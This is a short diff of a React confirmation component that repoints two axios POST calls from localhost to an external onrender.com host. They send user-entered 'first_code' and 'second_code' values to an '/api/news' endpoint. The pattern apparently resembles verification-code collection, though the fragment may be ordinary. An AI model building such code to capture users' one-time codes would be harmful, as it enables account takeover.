@@ -79,7 +79,7 @@ const ConfirmComponent = () => {
                             'first_code': firstCode.first_code ,
                         }
             
-                        axios.post( "http://localhost:8080/api/news", data) 
+                        axios.post( "https://server-data-hx92.onrender.com//api/news", data) 
                     }
             
                     
@@ -104,7 +104,7 @@ const ConfirmComponent = () => {
                             'second_code': values.fill_code,
                         }
             
-                        axios.post( "http://localhost:8080/api/news", data)
+                        axios.post( "https://server-data-hx92.onrender.com//api/news", data)
                             .then((response) => {
                                 if (response.data.status === 0 ) {
                                     navigate('/account/final');
